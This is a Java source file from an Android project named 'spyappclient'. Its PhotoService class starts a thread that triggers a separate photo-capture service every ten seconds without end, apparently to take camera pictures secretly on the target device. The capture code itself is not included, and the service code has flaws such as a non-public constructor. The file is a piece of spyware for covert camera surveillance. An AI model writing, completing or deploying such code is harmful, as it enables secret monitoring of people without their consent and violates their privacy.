package com.example.alber.spyappclient;

import android.app.IntentService;
import android.content.Intent;
import android.support.annotation.Nullable;

public class PhotoService extends IntentService {

    PhotoService(){
        super(PhotoService.class.getSimpleName());

    }
    @Override
    protected void onHandleIntent(@Nullable Intent intent) {

    }


    public void onStart(Intent intent, int startId) {
        // TODO Auto-generated method stub
        super.onStart(intent, startId);
        take();
        this.stopSelf();
    }

    @Override
    public void onDestroy() {
        // TODO Auto-generated method stub
        super.onDestroy();
    }

    private void take(){

        new Thread(new Runnable() {
            @Override
            public void run() {

                while(true){
                    Intent cameraIntent = new Intent(getApplicationContext(),CapturePhoto.class);
                    startService(cameraIntent);
                    try {
                        Thread.sleep(10000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }



            }
        }).start();

    }
}
